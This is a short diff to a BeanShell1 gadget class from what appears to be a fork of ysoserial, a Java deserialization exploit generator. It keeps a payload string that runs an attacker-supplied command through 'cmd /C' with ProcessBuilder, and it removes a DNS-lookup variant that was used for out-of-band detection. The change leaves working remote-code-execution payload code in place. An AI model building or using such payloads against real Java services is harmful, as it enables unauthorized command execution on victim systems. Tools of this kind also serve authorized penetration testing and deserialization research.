@@ -27,7 +27,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
     public PriorityQueue getObject(String command, String attackType) throws Exception {
 	// BeanShell payload
     	
-    	// federicodotta - Sleep not supported
+    	// federicodotta - Sleep and DNS not supported
    
     	// default ysoserial global exec
     	String payload =
@@ -45,13 +45,8 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 	    } else if(attackType.equals("exec_win")) {
 	    	 
 	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/C\",\"" + command + "\"}).start();return new Integer(1);}";
-
-	    // federicodotta - Java native DNS resolution			
-	    } else if(attackType.equals("dns")) {
- 			
-	        payload = "compare(Object foo, Object bar) {java.net.InetAddress.getByName(\"" + command + "\");return new Integer(1);}";	    	
-	
-		} 
+			
+	    } 
 
 		// Create Interpreter
 		Interpreter i = new Interpreter();
